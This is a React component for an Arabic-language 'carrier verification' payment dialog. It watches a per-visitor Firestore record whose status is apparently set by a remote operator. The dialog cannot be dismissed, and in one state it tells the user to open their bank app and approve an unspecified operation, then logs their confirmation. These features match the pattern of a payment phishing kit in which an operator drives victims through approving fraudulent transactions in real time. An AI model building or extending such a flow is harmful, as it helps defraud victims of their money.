"use client"

import { useEffect, useState } from "react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { Smartphone } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"

interface CarrierVerificationModalProps {
  open: boolean
  visitorId: string
  onApproved: () => void
  onRejected: () => void
}

export function CarrierVerificationModal({ 
  open, 
  visitorId, 
  onApproved, 
  onRejected 
}: CarrierVerificationModalProps) {
  const [status, setStatus] = useState<"pending" | "approved" | "rejected" | "message">("pending")
  const [isConfirming, setIsConfirming] = useState(false)

  useEffect(() => {
    if (!open || !visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const phoneOtpStatus = data.phoneOtpStatus as "pending" | "approved" | "rejected" | "verifying" | "message"

          if (phoneOtpStatus === "approved") {
            setStatus("approved")
            onApproved()
          } else if (phoneOtpStatus === "rejected") {
            setStatus("rejected")
            onRejected()
          } else if (phoneOtpStatus === "message") {
            setStatus("message")
          } else {
            setStatus("pending")
          }
        }
      },
      (error) => {
        console.error("[Carrier Modal] Listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [open, visitorId, onApproved, onRejected])

  const handleMessageConfirm = async () => {
    if (!visitorId || !db) return
    setIsConfirming(true)
    try {
      await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
    } catch (err) {
      console.error("[Carrier Modal] confirm error:", err)
      setIsConfirming(false)
    }
  }

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent 
        className="sm:max-w-md" 
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        {status === "message" ? (
          <div className="flex flex-col items-center justify-center space-y-6 py-8 px-4">
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#0a4a68]/10">
                <Smartphone className="h-8 w-8 text-[#0a4a68]" />
              </div>
            </div>
            <div className="space-y-3 text-center">
              <p className="text-lg font-bold leading-relaxed text-gray-800">
                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
              </p>
              <div className="flex items-center justify-center gap-2">
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "0ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "150ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
            <button
              onClick={handleMessageConfirm}
              disabled={isConfirming}
              className="w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all disabled:opacity-60 disabled:cursor-not-allowed"
              style={{
                background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
                color: "#1a3d52",
                boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
              }}
            >
              {isConfirming ? "جاري التأكيد..." : "تم الموافقة في التطبيق"}
            </button>
          </div>
        ) : (
          <div className="flex flex-col items-center justify-center space-y-6 py-8">
            <div className="relative w-20 h-20">
              <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-blue-500 rounded-full border-t-transparent animate-spin"></div>
            </div>
            <div className="text-center space-y-3 px-4">
              <h2 className="text-2xl font-bold text-gray-900">جاري المعالجة</h2>
              <p className="text-base text-gray-600 leading-relaxed">الرجاء الانتظار...</p>
            </div>
            <div className="flex flex-col items-center space-y-2">
              <div className="flex space-x-2 space-x-reverse">
                <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
                <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
                <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
              </div>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  )
}
